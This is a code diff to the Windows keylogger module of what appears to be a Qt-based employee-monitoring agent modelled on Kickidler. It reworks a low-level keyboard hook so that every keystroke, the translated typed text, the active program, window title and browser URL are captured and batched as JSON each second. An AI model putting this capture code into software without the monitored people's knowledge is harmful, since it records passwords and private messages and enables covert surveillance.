@@ -1,13 +1,18 @@
 #include "keylogger.h"
 
 #include <QDateTime>
+#include <QJsonObject>
+
+#include <string>
 
 Keylogger *Keylogger::s_instance = nullptr;
 
 Keylogger::Keylogger(QObject *parent)
     : QObject(parent)
 {
-    m_flushTimer.setInterval(2000);
+    // Batches go out every second: the live keystream under Monitors /
+    // Programs follows the typing closely.
+    m_flushTimer.setInterval(1000);
     connect(&m_flushTimer, &QTimer::timeout, this, &Keylogger::flush);
 }
 
@@ -16,30 +21,31 @@ Keylogger::~Keylogger()
     stop();
 }
 
+void Keylogger::setForegroundUrl(quintptr window, const QString &url)
+{
+    m_urlWindow = window;
+    m_url = url;
+}
+
 #ifdef Q_OS_WIN
 
 namespace {
-QString foregroundWindowTitle()
+QString windowTitle(HWND window)
 {
-    HWND fg = GetForegroundWindow();
-    if (!fg) {
+    const int length = GetWindowTextLengthW(window);
+    if (length <= 0) {
         return QString();
     }
-    wchar_t buffer[256] = {0};
-    GetWindowTextW(fg, buffer, 256);
-    return QString::fromWCharArray(buffer);
+    std::wstring buffer(size_t(length) + 1, L'\0');
+    const int copied = GetWindowTextW(window, buffer.data(), length + 1);
+    return QString::fromWCharArray(buffer.data(), qMax(0, copied));
 }
 
-// The foreground window's executable name (as ForegroundObserver reports
-// it), so a keylogger chunk carries the program it was typed into.
-QString foregroundExecutable()
+// The window's executable name (as ForegroundObserver reports it).
+QString windowExecutable(HWND window)
 {
-    HWND fg = GetForegroundWindow();
-    if (!fg) {
-        return QString();
-    }
     DWORD processId = 0;
-    GetWindowThreadProcessId(fg, &processId);
+    GetWindowThreadProcessId(window, &processId);
     if (processId == 0) {
         return QString();
     }
@@ -59,47 +65,106 @@ QString foregroundExecutable()
     return name;
 }
 
-// Best-effort virtual-key -> readable text, matching the bracketed-special-
-// key style visible in the Kickidler reference (e.g. "<ENTER>",
-// "<CAPSLOCK>") rather than trying to be a perfect terminal emulator.
-QString keyToText(DWORD vkCode)
+// The key's Linux evdev KEY_* code, which is what the original's grabber
+// reports: the PC set-1 scan code for the main block, the E0-prefixed keys
+// moved to their own codes, a few keys by their virtual key.
+int evdevCode(const KBDLLHOOKSTRUCT &info)
 {
-    switch (vkCode) {
-    case VK_RETURN: return QStringLiteral("<ENTER>");
-    case VK_BACK: return QStringLiteral("<BACKSPACE>");
-    case VK_TAB: return QStringLiteral("<TAB>");
-    case VK_ESCAPE: return QStringLiteral("<ESC>");
-    case VK_CAPITAL: return QStringLiteral("<CAPSLOCK>");
-    case VK_SPACE: return QStringLiteral(" ");
-    case VK_LEFT: return QStringLiteral("<LEFT>");
-    case VK_RIGHT: return QStringLiteral("<RIGHT>");
-    case VK_UP: return QStringLiteral("<UP>");
-    case VK_DOWN: return QStringLiteral("<DOWN>");
-    case VK_DELETE: return QStringLiteral("<DEL>");
-    case VK_HOME: return QStringLiteral("<HOME>");
-    case VK_END: return QStringLiteral("<END>");
+    const DWORD vk = info.vkCode;
+    switch (vk) {
+    case VK_NUMLOCK: return 0x45;
+    case VK_PAUSE: return 0x77;
+    case VK_SNAPSHOT: return 0x63; // SYSRQ (PrintScreen)
+    case VK_VOLUME_MUTE: return 0x71;
+    case VK_VOLUME_DOWN: return 0x72;
+    case VK_VOLUME_UP: return 0x73;
+    case VK_MEDIA_NEXT_TRACK: return 0xa3;
+    case VK_MEDIA_PLAY_PAUSE: return 0xa4;
+    case VK_MEDIA_PREV_TRACK: return 0xa5;
+    case VK_MEDIA_STOP: return 0xa6;
+    case VK_SLEEP: return 0x8e;
+    case VK_HELP: return 0x8a;
     default:
         break;
     }
-
-    BYTE keyboardState[256] = {0};
-    GetKeyboardState(keyboardState);
-    wchar_t chars[5] = {0};
-    const int result = ToUnicode(vkCode, MapVirtualKeyW(vkCode, MAPVK_VK_TO_VSC), keyboardState,
-                                 chars, 4, 0);
-    if (result >= 1) {
-        return QString::fromWCharArray(chars, result);
+    if (vk >= VK_F13 && vk <= VK_F24) {
+        return 0xb7 + int(vk - VK_F13);
     }
-    return QString();
+    DWORD scan = info.scanCode & 0xff;
+    bool extended = (info.flags & LLKHF_EXTENDED) != 0;
+    if (scan == 0) {
+        const UINT mapped = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC_EX);
+        scan = mapped & 0xff;
+        extended = (mapped & 0xff00) == 0xe000;
+    }
+    if (!extended) {
+        return int(scan);
+    }
+    switch (scan) {
+    case 0x1c: return 0x60; // KPENTER
+    case 0x1d: return 0x61; // RIGHTCTRL
+    case 0x35: return 0x62; // KPSLASH
+    case 0x37: return 0x63; // SYSRQ
+    case 0x38: return 0x64; // RIGHTALT
+    case 0x47: return 0x66; // HOME
+    case 0x48: return 0x67; // UP
+    case 0x49: return 0x68; // PAGEUP
+    case 0x4b: return 0x69; // LEFT
+    case 0x4d: return 0x6a; // RIGHT
+    case 0x4f: return 0x6b; // END
+    case 0x50: return 0x6c; // DOWN
+    case 0x51: return 0x6d; // PAGEDOWN
+    case 0x52: return 0x6e; // INSERT
+    case 0x53: return 0x6f; // DELETE
+    case 0x5b: return 0x7d; // LEFTMETA
+    case 0x5c: return 0x7e; // RIGHTMETA
+    case 0x5d: return 0x7f; // COMPOSE (the menu key)
+    default:
+        return int(scan);
+    }
 }
+
+// The text the key produces in the foreground window's keyboard layout
+// with the current Shift / AltGr / CapsLock state -- printable characters
+// only (control characters, e.g. with Ctrl held, give nothing).
+QString translatedText(const KBDLLHOOKSTRUCT &info, HWND window)
+{
+    BYTE state[256] = {0};
+    const auto held = [](int vk) { return (GetAsyncKeyState(vk) & 0x8000) != 0; };
+    for (int vk : {VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL, VK_RCONTROL, VK_MENU, VK_LMENU,
+                   VK_RMENU}) {
+        if (held(vk)) {
+            state[vk] = 0x80;
+        }
+    }
+    if (GetKeyState(VK_CAPITAL) & 1) {
+        state[VK_CAPITAL] = 0x01;
+    }
+    const HKL layout = GetKeyboardLayout(window ? GetWindowThreadProcessId(window, nullptr) : 0);
+    wchar_t chars[8] = {0};
+    // Flag 0x4: do not change the keyboard state (keeps dead keys intact
+    // for the application).
+    const int count = ToUnicodeEx(info.vkCode, info.scanCode, state, chars, 8, 0x4, layout);
+    QString text;
+    for (int i = 0; i < count; ++i) {
+        const QChar c(chars[i]);
+        if (c.unicode() >= 0x20 && c.unicode() != 0x7f) {
+            text += c;
+        }
+    }
+    return text;
 }
+} // namespace
 
 LRESULT CALLBACK Keylogger::keyboardProc(int code, WPARAM wParam, LPARAM lParam)
 {
-    if (code == HC_ACTION && s_instance
-        && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+    if (code == HC_ACTION && s_instance) {
         auto *info = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
-        s_instance->handleKeyDown(info->vkCode);
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            s_instance->handleKey(*info, true);
+        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+            s_instance->handleKey(*info, false);
+        }
     }
     return CallNextHookEx(nullptr, code, wParam, lParam);
 }
@@ -115,21 +180,40 @@ LRESULT CALLBACK Keylogger::mouseProc(int code, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(nullptr, code, wParam, lParam);
 }
 
-void Keylogger::handleKeyDown(DWORD vkCode)
+void Keylogger::handleKey(const KBDLLHOOKSTRUCT &info, bool down)
 {
-    noteActivity();
-
-    const QString title = foregroundWindowTitle();
-    const QString application = foregroundExecutable();
-    if (title != m_pendingWindowTitle || application != m_pendingApplication) {
+    if (down) {
+        noteActivity();
+    }
+    const int code = evdevCode(info);
+    int type = 3; // release
+    if (down) {
+        type = m_down.contains(quint32(code)) ? 2 : 1; // auto-repeat : press
+        m_down.insert(quint32(code));
+    } else {
+        m_down.remove(quint32(code));
+    }
+    HWND window = GetForegroundWindow();
+    QJsonObject event{{QStringLiteral("t"), static_cast<double>(QDateTime::currentMSecsSinceEpoch())},
+                      {QStringLiteral("k"), type},
+                      {QStringLiteral("c"), code}};
+    if (down) {
+        const QString text = translatedText(info, window);
+        if (!text.isEmpty()) {
+            event.insert(QStringLiteral("x"), text);
+        }
+    }
+    if (window) {
+        event.insert(QStringLiteral("a"), windowExecutable(window));
+        event.insert(QStringLiteral("w"), windowTitle(window));
+        if (reinterpret_cast<quintptr>(window) == m_urlWindow && !m_url.isEmpty()) {
+            event.insert(QStringLiteral("u"), m_url);
+        }
+    }
+    m_pending.append(event);
+    if (m_pending.size() >= 500) {
         flush();
-        m_pendingWindowTitle = title;
-        m_pendingApplication = application;
     }
-    if (m_pendingText.isEmpty()) {
-        m_pendingBeginMs = QDateTime::currentMSecsSinceEpoch();
-    }
-    m_pendingText += keyToText(vkCode);
 }
 
 void Keylogger::noteActivity()
@@ -153,6 +237,7 @@ bool Keylogger::start()
 void Keylogger::stop()
 {
     m_flushTimer.stop();
+    flush();
     if (m_keyboardHook) {
         UnhookWindowsHookEx(m_keyboardHook);
         m_keyboardHook = nullptr;
@@ -180,8 +265,10 @@ int Keylogger::consumeActivityCount()
 
 void Keylogger::flush()
 {
-    if (!m_pendingText.isEmpty()) {
-        emit textFlushed(m_pendingWindowTitle, m_pendingText, m_pendingBeginMs, m_pendingApplication);
-        m_pendingText.clear();
+    if (m_pending.isEmpty()) {
+        return;
     }
+    const QJsonArray batch = m_pending;
+    m_pending = QJsonArray();
+    emit eventsFlushed(batch);
 }
